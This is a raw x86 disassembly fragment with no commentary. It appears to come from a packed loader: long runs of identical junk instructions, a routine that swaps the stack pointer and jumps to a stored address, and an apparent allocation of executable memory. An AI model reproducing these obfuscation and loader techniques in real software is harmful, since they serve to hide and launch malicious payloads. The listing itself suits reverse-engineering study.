  4230c6:	mov    eax,DWORD PTR [ebp+0x8]
  4230c9:	mov    DWORD PTR [ebp-0x8],eax
  4230cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4230cf:	mov    DWORD PTR [ebp-0x4],ecx
  4230d2:	mov    DWORD PTR [ebp-0x10],0x19c
  4230d9:	mov    edx,DWORD PTR [ebp-0x8]
  4230dc:	mov    DWORD PTR ds:0x4258dc,edx
  4230e2:	mov    eax,DWORD PTR [ebp-0x4]
  4230e5:	mov    ds:0x4258e0,eax
  4230ea:	mov    ecx,DWORD PTR ds:0x4258dc
  4230f0:	mov    DWORD PTR [ebp-0x14],ecx
  4230f3:	mov    edx,DWORD PTR ds:0x4258e0
  4230f9:	mov    DWORD PTR [ebp-0xc],edx
  4230fc:	mov    eax,DWORD PTR [ebp-0xc]
  4230ff:	mov    ecx,DWORD PTR [ebp-0x14]
  423102:	lea    edx,[ecx+eax*2]
  423105:	mov    DWORD PTR [ebp-0x18],edx
  423108:	mov    eax,DWORD PTR [ebp-0x18]
  42310b:	mov    DWORD PTR [ebp-0x14],eax
  42310e:	mov    ecx,DWORD PTR [ebp-0x14]
  423111:	push   ecx
  423112:	call   0x4230b0
  423117:	add    esp,0x4
  42311a:	movzx  edx,ax
  42311d:	mov    DWORD PTR [ebp-0xc],edx
  423120:	mov    eax,DWORD PTR [ebp-0xc]
  423123:	mov    esp,ebp
  423125:	pop    ebp
  423126:	ret    
  423127:	int3   
  423128:	int3   
  423129:	int3   
  42312a:	int3   
  42312b:	int3   
  42312c:	int3   
  42312d:	int3   
  42312e:	int3   
  42312f:	int3   
  423130:	push   ebp
  423131:	mov    ebp,esp
  423133:	sub    esp,0xc
  423136:	mov    eax,DWORD PTR [ebp+0x8]
  423139:	mov    DWORD PTR [ebp-0x8],eax
  42313c:	mov    ecx,DWORD PTR [ebp+0xc]
  42313f:	mov    DWORD PTR [ebp-0xc],ecx
  423142:	mov    DWORD PTR [ebp-0x4],0x11afc
  423149:	mov    edx,DWORD PTR [ebp-0x8]
  42314c:	cmp    edx,DWORD PTR [ebp-0xc]
  42314f:	jae    0x42315f
  423151:	mov    DWORD PTR [ebp-0x4],0x11afc
  423158:	mov    eax,DWORD PTR [ebp-0x8]
  42315b:	jmp    0x423169
  42315d:	jmp    0x423169
  42315f:	mov    DWORD PTR [ebp-0x4],0x11afc
  423166:	mov    eax,DWORD PTR [ebp-0xc]
  423169:	mov    esp,ebp
  42316b:	pop    ebp
  42316c:	ret    
  42316d:	int3   
  42316e:	int3   
  42316f:	int3   
  423170:	push   ebp
  423171:	mov    ebp,esp
  423173:	push   ecx
  423174:	mov    DWORD PTR [ebp-0x4],0x3085
  42317b:	mov    DWORD PTR [ebp-0x4],0x3085
  423182:	mov    DWORD PTR [ebp-0x4],0x3085
  423189:	mov    DWORD PTR [ebp-0x4],0x3085
  423190:	mov    DWORD PTR [ebp-0x4],0x3085
  423197:	mov    DWORD PTR [ebp-0x4],0x3085
  42319e:	mov    DWORD PTR [ebp-0x4],0x3085
  4231a5:	mov    DWORD PTR [ebp-0x4],0x3085
  4231ac:	mov    DWORD PTR [ebp-0x4],0x3085
  4231b3:	mov    DWORD PTR [ebp-0x4],0x3085
  4231ba:	mov    DWORD PTR [ebp-0x4],0x3085
  4231c1:	mov    DWORD PTR [ebp-0x4],0x3085
  4231c8:	mov    DWORD PTR [ebp-0x4],0x3085
  4231cf:	mov    DWORD PTR [ebp-0x4],0x3085
  4231d6:	mov    DWORD PTR [ebp-0x4],0x3085
  4231dd:	mov    DWORD PTR [ebp-0x4],0x3085
  4231e4:	mov    DWORD PTR [ebp-0x4],0x3085
  4231eb:	mov    DWORD PTR [ebp-0x4],0x3085
  4231f2:	mov    DWORD PTR [ebp-0x4],0x3085
  4231f9:	mov    DWORD PTR [ebp-0x4],0x3085
  423200:	mov    DWORD PTR [ebp-0x4],0x3085
  423207:	mov    DWORD PTR [ebp-0x4],0x3085
  42320e:	mov    DWORD PTR [ebp-0x4],0x3085
  423215:	mov    DWORD PTR [ebp-0x4],0x3085
  42321c:	mov    DWORD PTR [ebp-0x4],0x3085
  423223:	mov    DWORD PTR [ebp-0x4],0x3085
  42322a:	mov    DWORD PTR [ebp-0x4],0x3085
  423231:	mov    DWORD PTR [ebp-0x4],0x3085
  423238:	mov    DWORD PTR [ebp-0x4],0x3085
  42323f:	mov    DWORD PTR [ebp-0x4],0x3085
  423246:	mov    DWORD PTR [ebp-0x4],0x3085
  42324d:	mov    DWORD PTR [ebp-0x4],0x3085
  423254:	mov    DWORD PTR [ebp-0x4],0x3085
  42325b:	mov    DWORD PTR [ebp-0x4],0x3085
  423262:	mov    DWORD PTR [ebp-0x4],0x3085
  423269:	mov    DWORD PTR [ebp-0x4],0x3085
  423270:	mov    DWORD PTR [ebp-0x4],0x3085
  423277:	mov    DWORD PTR [ebp-0x4],0x3085
  42327e:	mov    DWORD PTR [ebp-0x4],0x3085
  423285:	mov    DWORD PTR [ebp-0x4],0x3085
  42328c:	mov    DWORD PTR [ebp-0x4],0x3085
  423293:	cmp    DWORD PTR [ebp+0x8],0x1
  423297:	jne    0x4232a1
  423299:	mov    eax,ds:0x4258e4
  42329e:	mov    DWORD PTR [ebp+0x8],eax
  4232a1:	mov    ecx,DWORD PTR [ebp+0x10]
  4232a4:	push   ecx
  4232a5:	mov    edx,DWORD PTR [ebp+0xc]
  4232a8:	push   edx
  4232a9:	mov    eax,DWORD PTR [ebp+0x8]
  4232ac:	push   eax
  4232ad:	call   0x424240
  4232b2:	add    esp,0xc
  4232b5:	mov    ecx,DWORD PTR [ebp+0x8]
  4232b8:	push   ecx
  4232b9:	call   0x423060
  4232be:	add    esp,0x4
  4232c1:	mov    DWORD PTR [ebp+0x8],eax
  4232c4:	mov    eax,DWORD PTR [ebp+0x8]
  4232c7:	mov    esp,ebp
  4232c9:	pop    ebp
  4232ca:	ret    
  4232cb:	int3   
  4232cc:	int3   
  4232cd:	int3   
  4232ce:	int3   
  4232cf:	int3   
  4232d0:	push   ebp
  4232d1:	mov    ebp,esp
  4232d3:	push   ecx
  4232d4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232db:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232e2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232e9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232f0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232f7:	mov    DWORD PTR [ebp-0x4],0x22a7
  4232fe:	mov    DWORD PTR [ebp-0x4],0x22a7
  423305:	mov    DWORD PTR [ebp-0x4],0x22a7
  42330c:	mov    DWORD PTR [ebp-0x4],0x22a7
  423313:	mov    DWORD PTR [ebp-0x4],0x22a7
  42331a:	mov    DWORD PTR [ebp-0x4],0x22a7
  423321:	mov    DWORD PTR [ebp-0x4],0x22a7
  423328:	mov    DWORD PTR [ebp-0x4],0x22a7
  42332f:	mov    DWORD PTR [ebp-0x4],0x22a7
  423336:	mov    DWORD PTR [ebp-0x4],0x22a7
  42333d:	mov    DWORD PTR [ebp-0x4],0x22a7
  423344:	mov    DWORD PTR [ebp-0x4],0x22a7
  42334b:	mov    DWORD PTR [ebp-0x4],0x22a7
  423352:	mov    DWORD PTR [ebp-0x4],0x22a7
  423359:	mov    DWORD PTR [ebp-0x4],0x22a7
  423360:	mov    DWORD PTR [ebp-0x4],0x22a7
  423367:	mov    DWORD PTR [ebp-0x4],0x22a7
  42336e:	mov    DWORD PTR [ebp-0x4],0x22a7
  423375:	mov    DWORD PTR [ebp-0x4],0x22a7
  42337c:	mov    DWORD PTR [ebp-0x4],0x22a7
  423383:	mov    DWORD PTR [ebp-0x4],0x22a7
  42338a:	mov    DWORD PTR [ebp-0x4],0x22a7
  423391:	mov    DWORD PTR [ebp-0x4],0x22a7
  423398:	mov    DWORD PTR [ebp-0x4],0x22a7
  42339f:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233a6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233ad:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233b4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233bb:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233c2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233c9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233d0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233d7:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233de:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233e5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233ec:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233f3:	mov    DWORD PTR [ebp-0x4],0x22a7
  4233fa:	mov    DWORD PTR [ebp-0x4],0x22a7
  423401:	mov    DWORD PTR [ebp-0x4],0x22a7
  423408:	mov    DWORD PTR [ebp-0x4],0x22a7
  42340f:	mov    DWORD PTR [ebp-0x4],0x22a7
  423416:	mov    DWORD PTR [ebp-0x4],0x22a7
  42341d:	mov    DWORD PTR [ebp-0x4],0x22a7
  423424:	mov    DWORD PTR [ebp-0x4],0x22a7
  42342b:	mov    DWORD PTR [ebp-0x4],0x22a7
  423432:	mov    DWORD PTR [ebp-0x4],0x22a7
  423439:	mov    DWORD PTR [ebp-0x4],0x22a7
  423440:	mov    DWORD PTR [ebp-0x4],0x22a7
  423447:	mov    DWORD PTR [ebp-0x4],0x22a7
  42344e:	mov    DWORD PTR [ebp-0x4],0x22a7
  423455:	mov    DWORD PTR [ebp-0x4],0x22a7
  42345c:	mov    DWORD PTR [ebp-0x4],0x22a7
  423463:	mov    DWORD PTR [ebp-0x4],0x22a7
  42346a:	mov    DWORD PTR [ebp-0x4],0x22a7
  423471:	mov    DWORD PTR [ebp-0x4],0x22a7
  423478:	mov    DWORD PTR [ebp-0x4],0x22a7
  42347f:	mov    DWORD PTR [ebp-0x4],0x22a7
  423486:	mov    DWORD PTR [ebp-0x4],0x22a7
  42348d:	mov    DWORD PTR [ebp-0x4],0x22a7
  423494:	mov    DWORD PTR [ebp-0x4],0x22a7
  42349b:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234a2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234a9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234b0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234b7:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234be:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234c5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234cc:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234d3:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234da:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234e1:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234e8:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234ef:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234f6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4234fd:	mov    DWORD PTR [ebp-0x4],0x22a7
  423504:	mov    DWORD PTR [ebp-0x4],0x22a7
  42350b:	mov    DWORD PTR [ebp-0x4],0x22a7
  423512:	mov    DWORD PTR [ebp-0x4],0x22a7
  423519:	mov    DWORD PTR [ebp-0x4],0x22a7
  423520:	mov    DWORD PTR [ebp-0x4],0x22a7
  423527:	mov    DWORD PTR [ebp-0x4],0x22a7
  42352e:	mov    DWORD PTR [ebp-0x4],0x22a7
  423535:	mov    DWORD PTR [ebp-0x4],0x22a7
  42353c:	mov    DWORD PTR [ebp-0x4],0x22a7
  423543:	mov    DWORD PTR [ebp-0x4],0x22a7
  42354a:	mov    DWORD PTR [ebp-0x4],0x22a7
  423551:	mov    DWORD PTR [ebp-0x4],0x22a7
  423558:	mov    DWORD PTR [ebp-0x4],0x22a7
  42355f:	mov    DWORD PTR [ebp-0x4],0x22a7
  423566:	mov    DWORD PTR [ebp-0x4],0x22a7
  42356d:	mov    DWORD PTR [ebp-0x4],0x22a7
  423574:	mov    DWORD PTR [ebp-0x4],0x22a7
  42357b:	mov    DWORD PTR [ebp-0x4],0x22a7
  423582:	mov    DWORD PTR [ebp-0x4],0x22a7
  423589:	mov    DWORD PTR [ebp-0x4],0x22a7
  423590:	mov    DWORD PTR [ebp-0x4],0x22a7
  423597:	mov    DWORD PTR [ebp-0x4],0x22a7
  42359e:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235a5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235ac:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235b3:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235ba:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235c1:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235c8:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235cf:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235d6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235dd:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235e4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235eb:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235f2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4235f9:	mov    DWORD PTR [ebp-0x4],0x22a7
  423600:	mov    DWORD PTR [ebp-0x4],0x22a7
  423607:	mov    DWORD PTR [ebp-0x4],0x22a7
  42360e:	mov    DWORD PTR [ebp-0x4],0x22a7
  423615:	mov    DWORD PTR [ebp-0x4],0x22a7
  42361c:	mov    DWORD PTR [ebp-0x4],0x22a7
  423623:	mov    DWORD PTR [ebp-0x4],0x22a7
  42362a:	mov    DWORD PTR [ebp-0x4],0x22a7
  423631:	mov    DWORD PTR [ebp-0x4],0x22a7
  423638:	mov    DWORD PTR [ebp-0x4],0x22a7
  42363f:	mov    DWORD PTR [ebp-0x4],0x22a7
  423646:	mov    DWORD PTR [ebp-0x4],0x22a7
  42364d:	mov    DWORD PTR [ebp-0x4],0x22a7
  423654:	mov    DWORD PTR [ebp-0x4],0x22a7
  42365b:	mov    DWORD PTR [ebp-0x4],0x22a7
  423662:	mov    DWORD PTR [ebp-0x4],0x22a7
  423669:	mov    DWORD PTR [ebp-0x4],0x22a7
  423670:	mov    DWORD PTR [ebp-0x4],0x22a7
  423677:	mov    esp,ebp
  423679:	pop    ebp
  42367a:	ret    
  42367b:	int3   
  42367c:	int3   
  42367d:	int3   
  42367e:	int3   
  42367f:	int3   
  423680:	push   ebp
  423681:	mov    ebp,esp
  423683:	push   edi
  423684:	mov    edi,edi
  423686:	mov    edx,edx
  423688:	mov    edi,edi
  42368a:	mov    esp,DWORD PTR ds:0x4258e8
  423690:	mov    edi,edi
  423692:	mov    edx,edx
  423694:	mov    edi,edi
  423696:	add    esp,0x4
  423699:	mov    edi,edi
  42369b:	mov    edx,edx
  42369d:	mov    edi,edi
  42369f:	mov    edx,DWORD PTR ds:0x4258ec
  4236a5:	mov    edi,edi
  4236a7:	mov    edx,edx
  4236a9:	jmp    edx
  4236ab:	mov    edx,edx
  4236ad:	pop    edi
  4236ae:	pop    ebp
  4236af:	ret    
  4236b0:	push   ebp
  4236b1:	mov    ebp,esp
  4236b3:	call   0x423040
  4236b8:	mov    eax,ds:0x4258d8
  4236bd:	push   eax
  4236be:	call   0x423070
  4236c3:	add    esp,0x4
  4236c6:	mov    ds:0x4258d0,eax
  4236cb:	pop    ebp
  4236cc:	ret    
  4236cd:	int3   
  4236ce:	int3   
  4236cf:	int3   
  4236d0:	push   ebp
  4236d1:	mov    ebp,esp
  4236d3:	sub    esp,0x28
  4236d6:	mov    DWORD PTR [ebp-0x28],0x4013e9
  4236dd:	mov    DWORD PTR [ebp-0x24],0x1027
  4236e4:	mov    DWORD PTR [ebp-0x18],0x4
  4236eb:	mov    eax,DWORD PTR [ebp-0x18]
  4236ee:	mov    ecx,DWORD PTR [ebp-0x28]
  4236f1:	lea    edx,[ecx+eax*1+0x29]
  4236f5:	mov    DWORD PTR [ebp-0x20],edx
  4236f8:	mov    eax,DWORD PTR [ebp-0x20]
  4236fb:	mov    DWORD PTR [ebp-0x1c],eax
  4236fe:	mov    DWORD PTR [ebp-0x14],0x0
  423705:	lea    ecx,[ebp-0x14]
  423708:	push   ecx
  423709:	push   0x0
  42370b:	call   DWORD PTR ds:0x4252c0
  423711:	cmp    DWORD PTR [ebp-0x14],0x0
  423715:	jne    0x42371b
  423717:	xor    eax,eax
  423719:	jmp    0x423727
  42371b:	mov    edx,DWORD PTR [ebp-0x1c]
  42371e:	sub    edx,0x29
  423721:	mov    DWORD PTR ds:0x4258d8,edx
  423727:	mov    esp,ebp
  423729:	pop    ebp
  42372a:	ret    
  42372b:	int3   
  42372c:	int3   
  42372d:	int3   
  42372e:	int3   
  42372f:	int3   
  423730:	push   ebp
  423731:	mov    ebp,esp
  423733:	sub    esp,0x238
  423739:	mov    DWORD PTR [ebp-0x1c],0x307c
  423740:	mov    DWORD PTR [ebp-0x238],0x3000
  42374a:	mov    DWORD PTR [ebp-0x18],0x40
  423751:	mov    DWORD PTR [ebp-0x22c],0x0
  42375b:	mov    DWORD PTR [ebp-0x230],0x0
  423765:	mov    DWORD PTR [ebp-0x14],0x0
  42376c:	lea    eax,[ebp-0x14]
  42376f:	push   eax
  423770:	push   0x0
  423772:	call   DWORD PTR ds:0x4252c0
  423778:	cmp    DWORD PTR [ebp-0x14],0x0
  42377c:	jne    0x423782
  42377e:	xor    eax,eax
  423780:	jmp    0x42379e
  423782:	mov    ecx,DWORD PTR [ebp-0x18]
  423785:	push   ecx
  423786:	mov    edx,DWORD PTR [ebp-0x238]
  42378c:	push   edx
  42378d:	mov    eax,DWORD PTR [ebp+0x8]
  423790:	push   eax
  423791:	mov    ecx,DWORD PTR [ebp-0x22c]
  423797:	push   ecx
  423798:	call   DWORD PTR ds:0x4252c4
  42379e:	mov    esp,ebp
  4237a0:	pop    ebp
  4237a1:	ret    
  4237a2:	int3   
  4237a3:	int3   
  4237a4:	int3   
  4237a5:	int3   
  4237a6:	int3   
  4237a7:	int3   
  4237a8:	int3   
  4237a9:	int3   
  4237aa:	int3   
  4237ab:	int3   
  4237ac:	int3   
  4237ad:	int3   
  4237ae:	int3   
  4237af:	int3   
  4237b0:	push   ebp
  4237b1:	mov    ebp,esp
  4237b3:	sub    esp,0xc
  4237b6:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237bd:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237c4:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237cb:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237d2:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237d9:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237e0:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237e7:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237ee:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237f5:	mov    DWORD PTR [ebp-0xc],0x1024a
  4237fc:	mov    DWORD PTR [ebp-0xc],0x1024a
  423803:	mov    DWORD PTR [ebp-0xc],0x1024a
  42380a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423811:	mov    DWORD PTR [ebp-0xc],0x1024a
  423818:	mov    DWORD PTR [ebp-0xc],0x1024a
  42381f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423826:	mov    DWORD PTR [ebp-0xc],0x1024a
  42382d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423834:	mov    DWORD PTR [ebp-0xc],0x1024a
  42383b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423842:	mov    DWORD PTR [ebp-0xc],0x1024a
  423849:	mov    DWORD PTR [ebp-0xc],0x1024a
  423850:	mov    DWORD PTR [ebp-0xc],0x1024a
  423857:	mov    DWORD PTR [ebp-0xc],0x1024a
  42385e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423865:	mov    DWORD PTR [ebp-0xc],0x1024a
  42386c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423873:	mov    DWORD PTR [ebp-0xc],0x1024a
  42387a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423881:	mov    DWORD PTR [ebp-0xc],0x1024a
  423888:	mov    DWORD PTR [ebp-0xc],0x1024a
  42388f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423896:	mov    DWORD PTR [ebp-0xc],0x1024a
  42389d:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238a4:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238ab:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238b2:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238b9:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238c0:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238c7:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238ce:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238d5:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238dc:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238e3:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238ea:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238f1:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238f8:	mov    DWORD PTR [ebp-0xc],0x1024a
  4238ff:	mov    DWORD PTR [ebp-0xc],0x1024a
  423906:	mov    DWORD PTR [ebp-0xc],0x1024a
  42390d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423914:	mov    DWORD PTR [ebp-0xc],0x1024a
  42391b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423922:	mov    DWORD PTR [ebp-0xc],0x1024a
  423929:	mov    DWORD PTR [ebp-0xc],0x1024a
  423930:	mov    DWORD PTR [ebp-0xc],0x1024a
  423937:	mov    DWORD PTR [ebp-0xc],0x1024a
  42393e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423945:	mov    DWORD PTR [ebp-0xc],0x1024a
  42394c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423953:	mov    DWORD PTR [ebp-0xc],0x1024a
  42395a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423961:	mov    DWORD PTR [ebp-0xc],0x1024a
  423968:	mov    DWORD PTR [ebp-0xc],0x1024a
  42396f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423976:	mov    DWORD PTR [ebp-0xc],0x1024a
  42397d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423984:	mov    DWORD PTR [ebp-0xc],0x1024a
  42398b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423992:	mov    DWORD PTR [ebp-0xc],0x1024a
  423999:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239a0:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239a7:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239ae:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239b5:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239bc:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239c3:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239ca:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239d1:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239d8:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239df:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239e6:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239ed:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239f4:	mov    DWORD PTR [ebp-0xc],0x1024a
  4239fb:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a02:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a09:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a10:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a17:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a1e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a25:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a2c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a33:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a3a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a41:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a48:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a4f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a56:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a5d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a64:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a6b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a72:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a79:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a80:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a87:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a8e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a95:	mov    DWORD PTR [ebp-0xc],0x1024a
  423a9c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423aa3:	mov    DWORD PTR [ebp-0xc],0x1024a
  423aaa:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ab1:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ab8:	mov    DWORD PTR [ebp-0xc],0x1024a
  423abf:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ac6:	mov    DWORD PTR [ebp-0xc],0x1024a
  423acd:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ad4:	mov    DWORD PTR [ebp-0xc],0x1024a
  423adb:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ae2:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ae9:	mov    DWORD PTR [ebp-0xc],0x1024a
  423af0:	mov    DWORD PTR [ebp-0xc],0x1024a
  423af7:	mov    DWORD PTR [ebp-0xc],0x1024a
  423afe:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b05:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b0c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b13:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b1a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b21:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b28:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b2f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b36:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b3d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b44:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b4b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b52:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b59:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b60:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b67:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b6e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b75:	mov    eax,DWORD PTR [ebp+0x8]
  423b78:	cmp    DWORD PTR [eax+0x4],0x0
  423b7c:	je     0x423f6b
  423b82:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b89:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b90:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b97:	mov    DWORD PTR [ebp-0xc],0x1024a
  423b9e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ba5:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bac:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bb3:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bba:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bc1:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bc8:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bcf:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bd6:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bdd:	mov    DWORD PTR [ebp-0xc],0x1024a
  423be4:	mov    DWORD PTR [ebp-0xc],0x1024a
  423beb:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bf2:	mov    DWORD PTR [ebp-0xc],0x1024a
  423bf9:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c00:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c07:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c0e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c15:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c1c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c23:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c2a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c31:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c38:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c3f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c46:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c4d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c54:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c5b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c62:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c69:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c70:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c77:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c7e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c85:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c8c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c93:	mov    DWORD PTR [ebp-0xc],0x1024a
  423c9a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ca1:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ca8:	mov    DWORD PTR [ebp-0xc],0x1024a
  423caf:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cb6:	mov    DWORD PTR [ebp-0xc],0x1024a
